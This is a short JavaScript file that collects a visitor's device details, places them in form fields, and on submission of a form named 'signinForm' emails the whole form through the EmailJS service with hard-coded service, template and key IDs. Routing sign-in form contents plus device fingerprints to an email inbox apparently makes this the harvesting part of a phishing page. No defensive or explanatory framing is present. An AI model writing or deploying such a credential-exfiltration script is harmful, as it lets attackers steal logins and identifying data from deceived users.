const md = new MobileDetect(window.navigator.userAgent);
const deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    os: md.os(),
    phone: md.phone(),
    tablet: md.tablet(),
    browser: md.userAgent(),
};

console.log(deviceInfo);

(function () {
    emailjs.init("PXhop68B9ffo1twzE");
})();

const os = document.getElementById('os')
const users_phone = document.getElementById('phone')
const userAgent = document.getElementById('userAgent')
const browser = document.getElementById('browser')
const platform = document.getElementById('platform')

os.value = deviceInfo.os
users_phone.value = deviceInfo.phone
userAgent.value = deviceInfo.userAgent
browser.value = deviceInfo.browser
platform.value = deviceInfo.platform


document.getElementById('signinForm').addEventListener('submit', function (event) {
    event.preventDefault();
    // console.log(this);

    emailjs.sendForm('service_5wain8e', 'template_cq5p0kg', this)
        .then(function (response) {
            document.getElementById('response').innerText = 'Email sent successfully!';
            console.log('SUCCESS!', response.status, response.text);
        }, function (error) {
            document.getElementById('response').innerText = 'Failed to send email.';
            console.log('FAILED...', error);
        });
});


